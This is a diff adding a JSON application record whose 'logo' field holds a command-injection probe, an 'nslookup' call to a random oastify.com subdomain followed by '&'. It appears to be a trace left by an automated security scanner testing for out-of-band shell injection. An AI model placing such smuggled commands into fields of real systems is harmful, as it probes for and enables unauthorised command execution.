@@ -1,0 +1,15 @@
+{
+	"createdTime":1741342175352,
+	"deleted":false,
+	"enabled":false,
+	"id":"67cac5df19d8a25fc18fa810",
+	"lastModifiedBy":22743,
+	"lcName":"hsudcq",
+	"logo":"nslookup -q=cname jczqfxhqdtsj512koihkz5l1nstlhm8a1dp5cw0l.oastify.com.&",
+	"modifiedTime":1741342175352,
+	"name":"hsuDcq",
+	"ownerUserId":22743,
+	"standard":false,
+	"standardApp":false,
+	"version":0
+}
